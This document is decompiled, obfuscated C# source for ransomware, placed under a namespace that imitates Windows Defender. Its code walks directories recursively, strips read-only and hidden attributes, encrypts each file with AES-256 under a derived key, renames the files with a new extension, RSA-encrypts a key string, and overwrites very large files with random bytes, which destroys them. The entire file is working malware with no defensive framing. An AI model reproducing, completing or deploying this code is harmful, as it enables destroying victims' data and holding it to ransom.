using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Windows_Defender.Cryptor;

internal sealed class Class2
{
	private static FileAttributes smethod_0(FileAttributes fileAttributes_0, FileAttributes fileAttributes_1)
	{
		return fileAttributes_0 & ~fileAttributes_1;
	}

	public static void smethod_1(string string_0, string string_1, string string_2)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(string_1);
		bytes = SHA384.Create().ComputeHash(bytes);
		FileInfo fileInfo = new FileInfo(string_0);
		Path.GetExtension(string_0)!.ToLower();
		string name = fileInfo.Name;
		byte[] array;
		try
		{
			array = File.ReadAllBytes(string_0);
		}
		catch (Exception)
		{
			return;
		}
		byte[] bytes2 = Encoding.UTF8.GetBytes(name);
		if (bytes2.Length > 255)
		{
			return;
		}
		Array.Resize(ref array, array.Length + 256);
		Array.ConstrainedCopy(bytes2, 0, array, array.Length - 256, bytes2.Length);
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				attributes = smethod_0(attributes, FileAttributes.ReadOnly);
				File.SetAttributes(string_0, attributes);
			}
			else if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				attributes = smethod_0(attributes, FileAttributes.Hidden);
				File.SetAttributes(string_0, attributes);
			}
			array = smethod_3(array, bytes);
			if (array != null)
			{
				File.WriteAllBytes(string_0, array);
				File.Move(string_0, fileInfo.DirectoryName + Class8.smethod_1(-2084952246) + string_2);
			}
		}
		catch (Exception)
		{
		}
	}

	internal static void smethod_2(string string_0, string string_1, string string_2)
	{
		try
		{
			string empty = string.Empty;
			string empty2 = string.Empty;
			string empty3 = string.Empty;
			string[] array = null;
			string[] array2 = null;
			string[] array3 = null;
			string[] array4 = null;
			empty = Environment.SystemDirectory.Substring(0, 1);
			array = Class1.string_1;
			array2 = Class1.string_0;
			array3 = Directory.GetDirectories(string_0);
			array4 = Directory.GetFiles(string_0);
			long num = 0L;
			string[] array5 = array4;
			foreach (string text in array5)
			{
				FileInfo fileInfo = new FileInfo(text);
				empty2 = Path.GetExtension(text)!.ToLower();
				empty3 = Class8.smethod_1(-2084952238) + Tools.smethod_3(3) + Class8.smethod_1(-2084952285);
				try
				{
					num = fileInfo.Length;
				}
				catch (Exception)
				{
					num = 0L;
					continue;
				}
				if (array2.Contains(empty2) && Path.GetFileName(text) != Class8.smethod_1(-2084952263) && num <= 4096000000L && num != 0L)
				{
					smethod_1(text, string_1, empty3);
				}
				if (!array2.Contains(empty2) && Path.GetFileName(text) != Class8.smethod_1(-2084952263) && num <= 4096000000L && num != 0L && empty != text.Substring(0, 1))
				{
					smethod_1(text, string_1, empty3);
				}
				if (num > 4096000000L && Class1.string_2.Contains(empty2))
				{
					smethod_5(text);
				}
				if (array4.Length != 0)
				{
					Tools.smethod_2(string_0, string_2);
				}
			}
			array5 = array3;
			foreach (string text2 in array5)
			{
				string name = new DirectoryInfo(text2).Name;
				if (!array.Contains(name))
				{
					smethod_2(text2, string_1, string_2);
				}
			}
		}
		catch
		{
		}
	}

	internal static byte[] smethod_3(byte[] byte_0, byte[] byte_1)
	{
		byte[] array = null;
		byte[] byte_2 = Class1.byte_0;
		MemoryStream memoryStream = new MemoryStream();
		try
		{
			AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			try
			{
				aesCryptoServiceProvider.KeySize = 256;
				aesCryptoServiceProvider.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_1, byte_2, 1000);
				aesCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(aesCryptoServiceProvider.KeySize / 8);
				aesCryptoServiceProvider.IV = Class1.byte_1;
				aesCryptoServiceProvider.Mode = CipherMode.CBC;
				aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
				CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
				try
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.FlushFinalBlock();
					cryptoStream.Close();
				}
				finally
				{
					((IDisposable)cryptoStream).Dispose();
				}
				return memoryStream.ToArray();
			}
			finally
			{
				((IDisposable)aesCryptoServiceProvider).Dispose();
			}
		}
		finally
		{
			((IDisposable)memoryStream).Dispose();
		}
	}

	internal static string smethod_4(string string_0, string string_1)
	{
		byte[] array = null;
		string empty = string.Empty;
		string result = string.Empty;
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			try
			{
				rSACryptoServiceProvider.FromXmlString(string_1);
				array = Encoding.Unicode.GetBytes(string_0);
				empty = Convert.ToBase64String(rSACryptoServiceProvider.Encrypt(array, fOAEP: false));
				result = Tools.smethod_4(1, 0, empty);
			}
			catch (Exception)
			{
				return null;
			}
			finally
			{
				rSACryptoServiceProvider.PersistKeyInCsp = false;
			}
			return result;
		}
		finally
		{
			((IDisposable)rSACryptoServiceProvider).Dispose();
		}
	}

	public static void smethod_5(string string_0)
	{
		FileInfo fileInfo = new FileInfo(string_0);
		try
		{
			for (int i = 0; i < 3; i++)
			{
				byte[] bytes = Encoding.UTF8.GetBytes(Class8.smethod_1(-2084952296));
				byte[] array = new byte[bytes.Length + fileInfo.Length];
				new Random().NextBytes(array);
				for (int j = 0; j < bytes.Length; j++)
				{
					array[j] = bytes[j];
				}
				File.WriteAllBytes(fileInfo.FullName, array);
				File.SetAttributes(string_0, FileAttributes.ReadOnly);
			}
		}
		catch (Exception)
		{
		}
	}
}
